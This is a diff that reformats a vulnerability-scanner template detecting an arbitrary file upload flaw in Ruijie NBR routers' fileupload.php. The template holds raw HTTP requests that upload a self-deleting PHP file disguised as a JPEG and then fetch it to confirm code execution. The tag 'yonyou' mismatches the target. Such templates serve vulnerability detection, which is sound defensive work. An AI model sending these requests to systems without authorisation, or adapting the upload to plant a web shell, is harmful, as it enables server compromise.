@@ -1,38 +1,30 @@
-http:
-- matchers:
-  - condition: and
-    dsl:
-    - status_code_1 == 200
-    - status_code_2 == 200 && contains(body_2,"{{randstr_1}}")
-    type: dsl
-  raw:
-  - 'POST /ddi/server/fileupload.php?uploadDir=upload&name={{randstr_2}}.php HTTP/1.1
-
-    Host: {{Hostname}}
-
-    Accept: text/plain, */*; q=0.01
-
-    Content-Disposition: form-data; name="file"; filename="111.php"
-
-    Content-Type: image/jpeg
-
-
-    <?php echo "{{randstr_1}}"; unlink(__FILE__); ?>
-
-    '
-  - 'GET /ddi/server/upload/{{randstr_2}}.php HTTP/1.1
-
-    Host: {{Hostname}}
-
-    '
 id: ruijie-nbr-router-fileupload-upload
+
 info:
+  name: 锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞
   author: SleepingBag945
-  description: "\u9510\u6377 NBR \u8DEF\u7531\u5668 fileupload.php\u6587\u4EF6\u5B58\
-    \u5728\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\
-    \u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u4E0A\u4F20\u4EFB\u610F\u6587\u4EF6\u5230\
-    \u670D\u52A1\u5668\u83B7\u53D6\u670D\u52A1\u5668\u6743\u9650"
-  name: "\u9510\u6377 NBR \u8DEF\u7531\u5668 fileupload.php \u4EFB\u610F\u6587\u4EF6\
-    \u4E0A\u4F20\u6F0F\u6D1E"
   severity: critical
+  description: 锐捷 NBR 路由器 fileupload.php文件存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器获取服务器权限
   tags: yonyou
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/fileupload.php?uploadDir=upload&name={{randstr_2}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/plain, */*; q=0.01
+        Content-Disposition: form-data; name="file"; filename="111.php"
+        Content-Type: image/jpeg
+
+        <?php echo "{{randstr_1}}"; unlink(__FILE__); ?>
+      
+      - |
+        GET /ddi/server/upload/{{randstr_2}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - status_code_2 == 200 && contains(body_2,"{{randstr_1}}")
+        condition: and
